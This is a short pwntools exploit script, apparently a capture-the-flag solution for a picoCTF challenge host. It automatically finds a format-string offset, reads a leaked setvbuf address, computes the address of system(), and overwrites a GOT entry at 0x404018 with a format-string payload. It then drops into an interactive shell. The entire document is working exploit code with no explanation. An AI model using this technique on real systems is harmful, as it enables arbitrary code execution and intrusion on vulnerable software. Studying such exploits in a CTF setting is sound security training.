from pwn import *

context.log_level = "critical"
context.arch='amd64'

p = remote("rhea.picoctf.net", 62604)

def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 62604)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p.recvline()
setvbuf_address = p.recvline()
#setvbuf_address = p.recvregex(b'0x*\n')
setvbuf_address = setvbuf_address[58:-1]
system_address = int(setvbuf_address, 16) - 0x2ac90

payload = fmtstr_payload(offset, {0x404018: system_address})

p.sendline(payload)

p.interactive()